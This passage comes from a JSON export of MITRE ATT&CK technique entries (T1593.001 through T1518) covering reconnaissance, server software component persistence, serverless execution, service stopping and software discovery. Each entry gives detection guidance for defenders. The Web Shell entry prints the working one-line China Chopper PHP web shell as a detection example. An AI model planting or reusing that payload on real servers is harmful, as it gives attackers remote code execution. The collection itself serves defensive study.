Service](https://attack.mitre.org/techniques/T1566/003)).","url":"https://attack.mitre.org/techniques/T1593/001","created":"02 October 2020","last modified":"15 April 2021","version":"1.0","tactics":"Reconnaissance","detection":"Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.\n\nDetection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.","platforms":"PRE","data sources":null,"is sub-technique":true,"sub-technique of":"T1593","defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Google EXOTIC LILY March 2022),(Citation: ESET Lazarus Jun 2020),(Citation: Malwarebytes Kimsuky June 2021),"}
{"ID":"T1594","name":"Search Victim-Owned Websites","description":"Adversaries may search websites owned by the victim for information that can be used during targeting. Victim-owned websites may contain a variety of details, including names of departments/divisions, physical locations, and data about key employees such as names, roles, and contact info (ex: [Email Addresses](https://attack.mitre.org/techniques/T1589/002)). These sites may also have details highlighting business operations and relationships.(Citation: Comparitech Leak)\n\nAdversaries may search victim-owned websites to gather actionable information. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [Trusted Relationship](https://attack.mitre.org/techniques/T1199) or [Phishing](https://attack.mitre.org/techniques/T1566)).","url":"https://attack.mitre.org/techniques/T1594","created":"02 October 2020","last modified":"15 April 2021","version":"1.0","tactics":"Reconnaissance","detection":"Monitor for suspicious network traffic that could be indicative of adversary reconnaissance, such as rapid successions of requests indicative of web crawling and/or large quantities of requests originating from a single source (especially if the source is known to be associated with an adversary). Analyzing web metadata may also reveal artifacts that can be attributed to potentially malicious activity, such as referer or user-agent string HTTP/S fields.","platforms":"PRE","data sources":"Application Log: Application Log Content","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: US District Court Indictment GRU Unit 74455 October 2020),(Citation: Phish Labs Silent Librarian),(Citation: KISA Operation Muzabi),(Citation: DOJ Iran Indictments March 2018),(Citation: Proofpoint TA407 September 2019),(Citation: Google EXOTIC LILY March 2022),"}
{"ID":"T1505","name":"Server Software Component","description":"Adversaries may abuse legitimate extensible development features of servers to establish persistent access to systems. Enterprise server applications may include features that allow developers to write and install software or scripts to extend the functionality of the main application. Adversaries may install malicious components to extend and abuse server applications.(Citation: volexity_0day_sophos_FW)","url":"https://attack.mitre.org/techniques/T1505","created":"28 June 2019","last modified":"19 October 2022","version":"1.4","tactics":"Persistence","detection":"Consider monitoring application logs for abnormal behavior that may indicate suspicious installation of application software components. Consider monitoring file locations associated with the installation of new application software components such as paths from which applications typically load such extensible components.\n\nProcess monitoring may be used to detect servers components that perform suspicious actions such as running cmd.exe or accessing files. Log authentication attempts to the server and any unusual traffic patterns to or from the server and internal network. (Citation: US-CERT Alert TA15-314A Web Shells) ","platforms":"Linux, Network, Windows, macOS","data sources":"Application Log: Application Log Content, File: File Creation, File: File Modification, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow, Process: Process Creation","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":",(Citation: NSA and ASD Detect and Prevent Web Shells 2020),(Citation: ITSyndicate Disabling PHP functions),(Citation: Microsoft System Services Fundamentals)"}
{"ID":"T1505.004","name":"Server Software Component: IIS Components","description":"Adversaries may install malicious components that run on Internet Information Services (IIS) web servers to establish persistence. IIS provides several mechanisms to extend the functionality of the web servers. For example, Internet Server Application Programming Interface (ISAPI) extensions and filters can be installed to examine and/or modify incoming and outgoing IIS web requests. Extensions and filters are deployed as DLL files that export three functions: <code>Get{Extension/Filter}Version</code>, <code>Http{Extension/Filter}Proc</code>, and (optionally) <code>Terminate{Extension/Filter}</code>. IIS modules may also be installed to extend IIS web servers.(Citation: Microsoft ISAPI Extension Overview 2017)(Citation: Microsoft ISAPI Filter Overview 2017)(Citation: IIS Backdoor 2011)(Citation: Trustwave IIS Module 2013)\n\nAdversaries may install malicious ISAPI extensions and filters to observe and/or modify traffic, execute commands on compromised machines, or proxy command and control traffic. ISAPI extensions and filters may have access to all IIS web requests and responses. For example, an adversary may abuse these mechanisms to modify HTTP responses in order to distribute malicious commands/content to previously comprised hosts.(Citation: Microsoft ISAPI Filter Overview 2017)(Citation: Microsoft ISAPI Extension Overview 2017)(Citation: Microsoft ISAPI Extension All Incoming 2017)(Citation: Dell TG-3390)(Citation: Trustwave IIS Module 2013)(Citation: MMPC ISAPI Filter 2012)\n\nAdversaries may also install malicious IIS modules to observe and/or modify traffic. IIS 7.0 introduced modules that provide the same unrestricted access to HTTP requests and responses as ISAPI extensions and filters. IIS modules can be written as a DLL that exports <code>RegisterModule</code>, or as a .NET application that interfaces with ASP.NET APIs to access IIS HTTP requests.(Citation: Microsoft IIS Modules Overview 2007)(Citation: Trustwave IIS Module 2013)(Citation: ESET IIS Malware 2021)","url":"https://attack.mitre.org/techniques/T1505/004","created":"03 June 2021","last modified":"17 October 2021","version":"1.0","tactics":"Persistence","detection":"Monitor for creation and/or modification of files (especially DLLs on webservers) that could be abused as malicious ISAPI extensions/filters or IIS modules. Changes to <code>%windir%\\system32\\inetsrv\\config\\applicationhost.config</code> could indicate an IIS module installation.(Citation: Microsoft IIS Modules Overview 2007)(Citation: ESET IIS Malware 2021)\n\nMonitor execution and command-line arguments of <code>AppCmd.exe</code>, which may be abused to install malicious IIS modules.(Citation: Microsoft IIS Modules Overview 2007)(Citation: Unit 42 RGDoor Jan 2018)(Citation: ESET IIS Malware 2021)","platforms":"Windows","data sources":"Command: Command Execution, File: File Creation, File: File Modification","is sub-technique":true,"sub-technique of":"T1505","defenses bypassed":null,"contributors":"Wes Hurd","permissions required":"Administrator, SYSTEM","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: McAfee Lazarus Jul 2020),(Citation: ESET IIS Malware 2021),(Citation: CrowdStrike IceApple May 2022),(Citation: Unit 42 RGDoor Jan 2018),(Citation: Dell TG-3390),(Citation: Microsoft ISAPICGIRestriction 2016)"}
{"ID":"T1505.001","name":"Server Software Component: SQL Stored Procedures","description":"Adversaries may abuse SQL stored procedures to establish persistent access to systems. SQL Stored Procedures are code that can be saved and reused so that database users do not waste time rewriting frequently used SQL queries. Stored procedures can be invoked via SQL statements to the database using the procedure name or via defined events (e.g. when a SQL server application is started/restarted).\n\nAdversaries may craft malicious stored procedures that can provide a persistence mechanism in SQL database servers.(Citation: NetSPI Startup Stored Procedures)(Citation: Kaspersky MSSQL Aug 2019) To execute operating system commands through SQL syntax the adversary may have to enable additional functionality, such as xp_cmdshell for MSSQL Server.(Citation: NetSPI Startup Stored Procedures)(Citation: Kaspersky MSSQL Aug 2019)(Citation: Microsoft xp_cmdshell 2017) \n\nMicrosoft SQL Server can enable common language runtime (CLR) integration. With CLR integration enabled, application developers can write stored procedures using any .NET framework language (e.g. VB .NET, C#, etc.).(Citation: Microsoft CLR Integration 2017) Adversaries may craft or modify CLR assemblies that are linked to stored procedures since these CLR assemblies can be made to execute arbitrary commands.(Citation: NetSPI SQL Server CLR) ","url":"https://attack.mitre.org/techniques/T1505/001","created":"12 December 2019","last modified":"25 March 2020","version":"1.0","tactics":"Persistence","detection":"On a MSSQL Server, consider monitoring for xp_cmdshell usage.(Citation: NetSPI Startup Stored Procedures) Consider enabling audit features that can log malicious startup activities.","platforms":"Linux, Windows","data sources":"Application Log: Application Log Content","is sub-technique":true,"sub-technique of":"T1505","defenses bypassed":null,"contributors":"Carlos Borges, @huntingneo, CIP; Kaspersky; Lucas da Silva Pereira, @vulcanunsec, CIP","permissions required":"Administrator, root, SYSTEM","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Dragos Crashoverride 2018),(Citation: Nicolas Falliere, Liam O Murchu, Eric Chien February 2011),"}
{"ID":"T1505.005","name":"Server Software Component: Terminal Services DLL","description":"Adversaries may abuse components of Terminal Services to enable persistent access to systems. Microsoft Terminal Services, renamed to Remote Desktop Services in some Windows Server OSs as of 2022, enable remote terminal connections to hosts. Terminal Services allows servers to transmit a full, interactive, graphical user interface to clients via RDP.(Citation: Microsoft Remote Desktop Services)\n\n[Windows Service](https://attack.mitre.org/techniques/T1543/003)s that are run as a \"generic\" process (ex: <code>svchost.exe</code>) load the service's DLL file, the location of which is stored in a Registry entry named <code>ServiceDll</code>.(Citation: Microsoft System Services Fundamentals) The <code>termsrv.dll</code> file, typically stored in `%SystemRoot%\\System32\\`, is the default <code>ServiceDll</code> value for Terminal Services in `HKLM\\System\\CurrentControlSet\\services\\TermService\\Parameters\\`.\n\nAdversaries may modify and/or replace the Terminal Services DLL to enable persistent access to victimized hosts.(Citation: James TermServ DLL) Modifications to this DLL could be done to execute arbitrary payloads (while also potentially preserving normal <code>termsrv.dll</code> functionality) as well as to simply enable abusable features of Terminal Services. For example, an adversary may enable features such as concurrent [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001) sessions by either patching the <code>termsrv.dll</code> file or modifying the <code>ServiceDll</code> value to point to a DLL that provides increased RDP functionality.(Citation: Windows OS Hub RDP)(Citation: RDPWrap Github) On a non-server Windows OS this increased functionality may also enable an adversary to avoid Terminal Services prompts that warn/log out users of a system when a new RDP session is created.","url":"https://attack.mitre.org/techniques/T1505/005","created":"28 March 2022","last modified":"18 April 2022","version":"1.0","tactics":"Persistence","detection":"Monitor for changes to Registry keys associated with <code>ServiceDll</code> and other subkey values under <code>HKLM\\System\\CurrentControlSet\\services\\TermService\\Parameters\\</code>.\n\nMonitor unexpected changes and/or interactions with <code>termsrv.dll</code>, which is typically stored in <code>%SystemRoot%\\System32\\</code>.\n\nMonitor commands as well as  processes and arguments for potential adversary actions to modify Registry values (ex: <code>reg.exe</code>) or modify/replace the legitimate <code>termsrv.dll</code>.\n\nMonitor module loads by the Terminal Services process (ex: <code>svchost.exe -k termsvcs</code>) for unexpected DLLs (the default is <code>%SystemRoot%\\System32\\termsrv.dll</code>, though an adversary could also use [Match Legitimate Name or Location](https://attack.mitre.org/techniques/T1036/005) on a malicious payload).","platforms":"Windows","data sources":"Command: Command Execution, File: File Modification, Module: Module Load, Process: Process Creation, Windows Registry: Windows Registry Key Modification","is sub-technique":true,"sub-technique of":"T1505","defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":",(Citation: Microsoft System Services Fundamentals)"}
{"ID":"T1505.002","name":"Server Software Component: Transport Agent","description":"Adversaries may abuse Microsoft transport agents to establish persistent access to systems. Microsoft Exchange transport agents can operate on email messages passing through the transport pipeline to perform various tasks such as filtering spam, filtering malicious attachments, journaling, or adding a corporate signature to the end of all outgoing emails.(Citation: Microsoft TransportAgent Jun 2016)(Citation: ESET LightNeuron May 2019) Transport agents can be written by application developers and then compiled to .NET assemblies that are subsequently registered with the Exchange server. Transport agents will be invoked during a specified stage of email processing and carry out developer defined tasks. \n\nAdversaries may register a malicious transport agent to provide a persistence mechanism in Exchange Server that can be triggered by adversary-specified email events.(Citation: ESET LightNeuron May 2019) Though a malicious transport agent may be invoked for all emails passing through the Exchange transport pipeline, the agent can be configured to only carry out specific tasks in response to adversary defined criteria. For example, the transport agent may only carry out an action like copying in-transit attachments and saving them for later exfiltration if the recipient email address matches an entry on a list provided by the adversary. ","url":"https://attack.mitre.org/techniques/T1505/002","created":"12 December 2019","last modified":"18 October 2021","version":"1.0","tactics":"Persistence","detection":"Consider monitoring application logs for abnormal behavior that may indicate suspicious installation of application software components. Consider monitoring file locations associated with the installation of new application software components such as paths from which applications typically load such extensible components.","platforms":"Linux, Windows","data sources":"Application Log: Application Log Content, File: File Creation","is sub-technique":true,"sub-technique of":"T1505","defenses bypassed":null,"contributors":"Christoffer Strömblad; ESET","permissions required":"Administrator, root, SYSTEM","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: ESET LightNeuron May 2019),"}
{"ID":"T1505.003","name":"Server Software Component: Web Shell","description":"Adversaries may backdoor web servers with web shells to establish persistent access to systems. A Web shell is a Web script that is placed on an openly accessible Web server to allow an adversary to use the Web server as a gateway into a network. A Web shell may provide a set of functions to execute or a command-line interface on the system that hosts the Web server.(Citation: volexity_0day_sophos_FW)\n\nIn addition to a server-side script, a Web shell may have a client interface program that is used to talk to the Web server (e.g. [China Chopper](https://attack.mitre.org/software/S0020) Web shell client).(Citation: Lee 2013)","url":"https://attack.mitre.org/techniques/T1505/003","created":"13 December 2019","last modified":"30 March 2023","version":"1.3","tactics":"Persistence","detection":"Web shells can be difficult to detect. Unlike other forms of persistent remote access, they do not initiate connections. The portion of the Web shell that is on the server may be small and innocuous looking. The PHP version of the China Chopper Web shell, for example, is the following short payload: (Citation: Lee 2013) \n\n<code>&lt;?php @eval($_POST['password']);&gt;</code>\n\nNevertheless, detection mechanisms exist. Process monitoring may be used to detect Web servers that perform suspicious actions such as spawning cmd.exe or accessing files that are not in the Web directory.(Citation: NSA Cyber Mitigating Web Shells)\n\nFile monitoring may be used to detect changes to files in the Web directory of a Web server that do not match with updates to the Web server's content and may indicate implantation of a Web shell script.(Citation: NSA Cyber Mitigating Web Shells)\n\nLog authentication attempts to the server and any unusual traffic patterns to or from the server and internal network. (Citation: US-CERT Alert TA15-314A Web Shells)","platforms":"Linux, Network, Windows, macOS","data sources":"Application Log: Application Log Content, File: File Creation, File: File Modification, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow, Process: Process Creation","is sub-technique":true,"sub-technique of":"T1505","defenses bypassed":null,"contributors":"Arnim Rupp, Deutsche Lufthansa AG","permissions required":null,"supports remote":null,"system requirements":"Adversary access to Web server with vulnerability or account to upload and serve the Web shell file.","impact type":null,"effective permissions":null,"relationship citations":"(Citation: Cybersecurity Advisory SVR TTP May 2021),(Citation: Volexity OceanLotus Nov 2017),(Citation: Guidepoint SUPERNOVA Dec 2020),(Citation: CISA Supernova Jan 2021),(Citation: Checkpoint MosesStaff Nov 2021),(Citation: FoxIT Wocao December 2019),(Citation: CISA AA21-200A APT40 July 2021),(Citation: FireEye APT39 Jan 2019),(Citation: ClearSky Lebanese Cedar Jan 2021),(Citation: Cybereason OperationCuckooBees May 2022),(Citation: Microsoft GALLIUM December 2019),(Citation: CISA AA20-301A Kimsuky),(Citation: US-CERT TA18-074A),(Citation: CISA AA20-239A BeagleBoyz August 2020),(Citation: Rapid7 HAFNIUM Mar 2021),(Citation: FireEye Exchange Zero Days March 2021),(Citation: Unit42 SUPERNOVA Dec 2020),(Citation: Cybersecurity Advisory GRU Brute Force Campaign July 2021),(Citation: Unit42 Emissary Panda May 2019),(Citation: Dell TG-3390),(Citation: Microsoft HAFNIUM March 2020),(Citation: FireEye TRITON 2019),(Citation: Mandiant APT41),(Citation: ESET Exchange Mar 2021),(Citation: FireEye APT40 March 2019),(Citation: CrowdStrike Deep Panda Web Shells),(Citation: Volexity Exchange Marauder March 2021),(Citation: ANSSI Sandworm January 2021),(Citation: Unit42 OilRig Playbook 2023),(Citation: Tarrask scheduled task),(Citation: FireEye APT34 Webinar Dec 2017),(Citation: ESET BackdoorDiplomacy Jun 2021),(Citation: DFIR Phosphorus November 2021),(Citation: CISA AA20-259A Iran-Based Actor September 2020),(Citation: ClearSky Pay2Kitten December 2020),(Citation: Cybereason Soft Cell June 2019),(Citation: Lee 2013),(Citation: CheckPoint Volatile Cedar March 2015),(Citation: TrendMicro Tropic Trooper May 2020),(Citation: Crowdstrike GTR2020 Mar 2020),(Citation: DFIR Report APT35 ProxyShell March 2022),(Citation: NSA and ASD Detect and Prevent Web Shells 2020),(Citation: ITSyndicate Disabling PHP functions)"}
{"ID":"T1648","name":"Serverless Execution","description":"Adversaries may abuse serverless computing, integration, and automation services to execute arbitrary code in cloud environments. Many cloud providers offer a variety of serverless resources, including compute engines, application integration services, and web servers. \n\nAdversaries may abuse these resources in various ways as a means of executing arbitrary commands. For example, adversaries may use serverless functions to execute malicious code, such as crypto-mining malware (i.e. [Resource Hijacking](https://attack.mitre.org/techniques/T1496)).(Citation: Cado Security Denonia) Adversaries may also create functions that enable further compromise of the cloud environment. For example, an adversary may use the `IAM:PassRole` permission in AWS or the `iam.serviceAccounts.actAs` permission in Google Cloud to add [Additional Cloud Roles](https://attack.mitre.org/techniques/T1098/003) to a serverless cloud function, which may then be able to perform actions the original user cannot.(Citation: Rhino Security Labs AWS Privilege Escalation)(Citation: Rhingo Security Labs GCP Privilege Escalation)\n\nServerless functions can also be invoked in response to cloud events (i.e. [Event Triggered Execution](https://attack.mitre.org/techniques/T1546)), potentially enabling persistent execution over time. For example, in AWS environments, an adversary may create a Lambda function that automatically adds [Additional Cloud Credentials](https://attack.mitre.org/techniques/T1098/001) to a user and a corresponding CloudWatch events rule that invokes that function whenever a new user is created.(Citation: Backdooring an AWS account) Similarly, an adversary may create a Power Automate workflow in Office 365 environments that forwards all emails a user receives or creates anonymous sharing links whenever a user is granted access to a document in SharePoint.(Citation: Varonis Power Automate Data Exfiltration)(Citation: Microsoft DART Case Report 001)","url":"https://attack.mitre.org/techniques/T1648","created":"27 May 2022","last modified":"24 October 2022","version":"1.0","tactics":"Execution","detection":null,"platforms":"IaaS, Office 365, SaaS","data sources":"Application Log: Application Log Content, Cloud Service: Cloud Service Modification","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":"Alex Soler, AttackIQ; Cisco; Oleg Kolesnikov, Securonix; Praetorian; Shailesh Tiwary (Indian Army); Varonis Threat Labs","permissions required":null,"supports remote":false,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":","}
{"ID":"T1489","name":"Service Stop","description":"Adversaries may stop or disable services on a system to render those services unavailable to legitimate users. Stopping critical services or processes can inhibit or stop response to an incident or aid in the adversary's overall objectives to cause damage to the environment.(Citation: Talos Olympic Destroyer 2018)(Citation: Novetta Blockbuster) \n\nAdversaries may accomplish this by disabling individual services of high importance to an organization, such as <code>MSExchangeIS</code>, which will make Exchange content inaccessible (Citation: Novetta Blockbuster). In some cases, adversaries may stop or disable many or all services to render systems unusable.(Citation: Talos Olympic Destroyer 2018) Services or processes may not allow for modification of their data stores while running. Adversaries may stop services or processes in order to conduct [Data Destruction](https://attack.mitre.org/techniques/T1485) or [Data Encrypted for Impact](https://attack.mitre.org/techniques/T1486) on the data stores of services like Exchange and SQL Server.(Citation: SecureWorks WannaCry Analysis)","url":"https://attack.mitre.org/techniques/T1489","created":"29 March 2019","last modified":"28 July 2022","version":"1.2","tactics":"Impact","detection":"Monitor processes and command-line arguments to see if critical processes are terminated or stop running.\n\nMonitor for edits for modifications to services and startup programs that correspond to services of high importance. Look for changes to services that do not correlate with known software, patch cycles, etc. Windows service information is stored in the Registry at <code>HKLM\\SYSTEM\\CurrentControlSet\\Services</code>. Systemd service unit files are stored within the /etc/systemd/system, /usr/lib/systemd/system/, and /home/.config/systemd/user/ directories, as well as associated symbolic links.\n\nAlterations to the service binary path or the service startup type changed to disabled may be suspicious.\n\nRemote access tools with built-in features may interact directly with the Windows API to perform these functions outside of typical system utilities. For example, <code>ChangeServiceConfigW</code> may be used by an adversary to prevent services from starting.(Citation: Talos Olympic Destroyer 2018)","platforms":"Linux, Windows, macOS","data sources":"Command: Command Execution, File: File Modification, Process: OS API Execution, Process: Process Creation, Process: Process Termination, Service: Service Metadata, Windows Registry: Windows Registry Key Modification","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":"Availability","effective permissions":null,"relationship citations":"(Citation: Unit42 Clop April 2021),(Citation: Fortinet Diavol July 2021),(Citation: Palo Alto Unit 42 EKANS),(Citation: Microsoft Prestige ransomware October 2022),(Citation: Secureworks REvil September 2019),(Citation: CrowdStrike Ryuk January 2019),(Citation: McAfee Cuba April 2021),(Citation: Cybereason Royal December 2022),(Citation: Check Point Pay2Key November 2020),(Citation: Sogeti CERT ESEC Babuk March 2021),(Citation: Mcafee Clop Aug 2019),(Citation: Novetta Blockbuster Destructive Malware),(Citation: SecureWorks WannaCry Analysis),(Citation: FireEye WannaCry 2017),(Citation: CERT-FR PYSA April 2020),(Citation: Dragos Crashoverride 2017),(Citation: Microsoft BlackCat Jun 2022),(Citation: Trend Micro KillDisk 2),(Citation: Malwarebytes AvosLocker Jul 2021),(Citation: CarbonBlack Conti July 2020),(Citation: Dragos EKANS),(Citation: FireEye Ransomware Feb 2020),(Citation: Symantec WastedLocker June 2020),(Citation: Carbon Black HotCroissant April 2020),(Citation: Arxiv Avaddon Feb 2021),(Citation: McAfee Babuk February 2021),(Citation: IBM MegaCortex),(Citation: CISA MAR SLOTHFULMEDIA October 2020),(Citation: DFIR Ryuk's Return October 2020),(Citation: Sophos Maze VM September 2020),(Citation: Sophos Ragnar May 2020),(Citation: Check Point Meteor Aug 2021),(Citation: Sophos BlackCat Jul 2022),(Citation: Talos Olympic Destroyer 2018),(Citation: CarbonBlack RobbinHood May 2019),(Citation: Qualys Hermetic Wiper March 2022),(Citation: Proofpoint LookBack Malware Aug 2019),(Citation: TrendMicro Netwalker May 2020),(Citation: Trend Micro Ransomware February 2021),(Citation: Intel 471 REvil March 2020),"}
{"ID":"T1129","name":"Shared Modules","description":"Adversaries may execute malicious payloads via loading shared modules. The Windows module loader can be instructed to load DLLs from arbitrary local paths and arbitrary Universal Naming Convention (UNC) network paths. This functionality resides in NTDLL.dll and is part of the Windows [Native API](https://attack.mitre.org/techniques/T1106) which is called from functions like <code>CreateProcess</code>, <code>LoadLibrary</code>, etc. of the Win32 API.(Citation: Wikipedia Windows Library Files)\n\nThe module loader can load DLLs:\n\n* via specification of the (fully-qualified or relative) DLL pathname in the IMPORT directory;\n    \n* via EXPORT forwarded to another DLL, specified with (fully-qualified or relative) pathname (but without extension);\n    \n* via an NTFS junction or symlink program.exe.local with the fully-qualified or relative pathname of a directory containing the DLLs specified in the IMPORT directory or forwarded EXPORTs;\n    \n* via <code>&#x3c;file name=\"filename.extension\" loadFrom=\"fully-qualified or relative pathname\"&#x3e;</code> in an embedded or external \"application manifest\". The file name refers to an entry in the IMPORT directory or a forwarded EXPORT.\n\nAdversaries may use this functionality as a way to execute arbitrary payloads on a victim system. For example, malware may execute share modules to load additional components or features.","url":"https://attack.mitre.org/techniques/T1129","created":"31 May 2017","last modified":"19 April 2022","version":"2.1","tactics":"Execution","detection":"Monitoring DLL module loads may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances, since benign use of Windows modules load functions are common and may be difficult to distinguish from malicious behavior. Legitimate software will likely only need to load routine, bundled DLL modules or Windows system DLLs such that deviation from known module loads may be suspicious. Limiting DLL module loads to <code>%SystemRoot%</code> and <code>%ProgramFiles%</code> directories will protect against module loads from unsafe paths. \n\nCorrelation of other events with behavior surrounding module loads using API monitoring and suspicious DLLs written to disk will provide additional context to an event that may assist in determining if it is due to malicious behavior.","platforms":"Windows","data sources":"Module: Module Load, Process: OS API Execution","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":"Stefan Kanthak","permissions required":null,"supports remote":false,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Gh0stRAT ATT March 2019),(Citation: Prevailion DarkWatchman 2021),(Citation: Symantec Hydraq Jan 2010),(Citation: Fortinet Metamorfo Feb 2020),(Citation: Symantec Trojan.Hydraq Jan 2010),(Citation: FireEye FIN7 Oct 2019),(Citation: FireEye Know Your Enemy FIN8 Aug 2016),(Citation: Nicolas Falliere, Liam O Murchu, Eric Chien February 2011),(Citation: ESET PipeMon May 2020),(Citation: Cybereason Astaroth Feb 2019),(Citation: Medium Ali Salem Bumblebee April 2022),(Citation: Trend Micro KillDisk 1),(Citation: CyberBit Dtrack),(Citation: ESET Attor Oct 2019),(Citation: Kaspersky TajMahal April 2019),(Citation: MSTIC FoggyWeb September 2021),(Citation: US-CERT BLINDINGCAN Aug 2020),"}
{"ID":"T1072","name":"Software Deployment Tools","description":"Adversaries may gain access to and use third-party software suites installed within an enterprise network, such as administration, monitoring, and deployment systems, to move laterally through the network. Third-party applications and software deployment systems may be in use in the network environment for administration purposes (e.g., SCCM, HBSS, Altiris, etc.).\n\nAccess to a third-party network-wide or enterprise-wide software system may enable an adversary to have remote code execution on all systems that are connected to such a system. The access may be used to laterally move to other systems, gather information, or cause a specific effect, such as wiping the hard drives on all endpoints.\n\nThe permissions required for this action vary by system configuration; local credentials may be sufficient with direct access to the third-party system, or specific domain credentials may be required. However, the system may require an administrative account to log in or to perform it's intended purpose.","url":"https://attack.mitre.org/techniques/T1072","created":"31 May 2017","last modified":"30 March 2023","version":"2.1","tactics":"Execution, Lateral Movement","detection":"Detection methods will vary depending on the type of third-party software or system and how it is typically used. \n\nThe same investigation process can be applied here as with other potentially malicious activities where the distribution vector is initially unknown but the resulting activity follows a discernible pattern. Analyze the process execution trees, historical activities from the third-party application (such as what types of files are usually pushed), and the resulting activities or events from the file/binary/script pushed to systems. \n\nOften these third-party applications will have logs of their own that can be collected and correlated with other data from the environment. Ensure that third-party application logs are on-boarded to the enterprise logging system and the logs are regularly reviewed. Audit software deployment logs and look for suspicious or unauthorized activity. A system not typically used to push software to clients that suddenly is used for such a task outside of a known admin function may be suspicious. Monitor account login activity on these applications to detect suspicious/abnormal usage.\n\nPerform application deployment at regular times so that irregular deployment activity stands out. Monitor process activity that does not correlate to known good software. Monitor account login activity on the deployment system.","platforms":"Linux, Windows, macOS","data sources":"Application Log: Application Log Content, Process: Process Creation","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":"Shane Tully, @securitygypsy","permissions required":"Administrator, SYSTEM, User","supports remote":true,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Microsoft Prestige ransomware October 2022),(Citation: Dell Wiper),(Citation: Dell TG-1314),(Citation: FireEye APT32 May 2017),(Citation: Group IB Silence Sept 2018),(Citation: Cisco Talos Avos Jun 2022),"}
{"ID":"T1518","name":"Software Discovery","description":"Adversaries may attempt to get a listing of software and software versions that are installed on a system or in a cloud environment. Adversaries may use the information from [Software Discovery](https://attack.mitre.org/techniques/T1518) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nAdversaries may attempt to enumerate software for a variety of reasons, such as figuring out what security measures are present or if the compromised system has a version of software that is vulnerable to [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068).","url":"https://attack.mitre.org/techniques/T1518","created":"16 September 2019","last modified":"30 March 2023","version":"1.3","tactics":"Discovery","detection":"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as lateral movement, based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).","platforms":"Azure AD, Google Workspace, IaaS, Linux, Office 365, SaaS, Windows, macOS","data sources":"Command: Command Execution, Firewall: Firewall Enumeration, Firewall: Firewall Metadata, Process: OS API Execution, Process: Process Creation","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":null,"permissions required":"Administrator, User","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Trend Micro Muddy Water March 2021),(Citation: Kaspersky Ferocious Kitten Jun 2021),(Citation: MalwareBytes SideCopy Dec 2021),(Citation: FoxIT Wocao December 2019),(Citation: ESET InvisiMole June 2020),(Citation: Proofpoint Leviathan Oct 2017),(Citation: FOX-IT May 2016 Mofang),(Citation: trendmicro xcsset xcode project 2020),(Citation: MalwareBytes WoodyRAT Aug 2022),(Citation: FireEye Metamorfo Apr 2018),(Citation: ATT Sidewinder January 2021),(Citation: BlackBerry Bahamut),(Citation: ESET InvisiMole June 2018),(Citation: Mandiant UNC3890 Aug 2022),(Citation: Malwarebytes Dyreza November 2015),(Citation: Cybereason Bazar July 2020),(Citation: Check Point APT35 CharmPower January 2022),(Citation: Kaspersky MoleRATs April 2019),(Citation: HP SVCReady Jun 2022),(Citation: Anomali MUSTANG PANDA October 2019),(Citation: Trend Micro Tick November 2019),(Citation: Kaspersky Lyceum October 2021),(Citation: ESET ForSSHe December 2018),(Citation: ANSSI Sandworm January 2021),(Citation: MacKeeper Bundlore Apr 2019),(Citation: Group IB Ransomware September 2020),(Citation: Carbon Black HotCroissant April 2020),(Citation: ESET ComRAT May 2020),(Citation: ESET RTM Feb 2017),(Citation: Kaspersky TajMahal April 2019),(Citation: Rewterz Sidewinder APT April 2020),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: Unit 42 Siloscape Jun 2021),(Citation: Cylance Dust Storm),(Citation: Symantec Inception Framework March 2018),(Citation: ESET Casbaneiro Oct 2019),(Citation: TrendMicro Tropic Trooper May 2020),(Citation: Secureworks GOLD KINGSWOOD September 2018),(Citation: Checkpoint Dridex Jan 2021),(Citation: Cybereason Kimsuky November 2020),"}
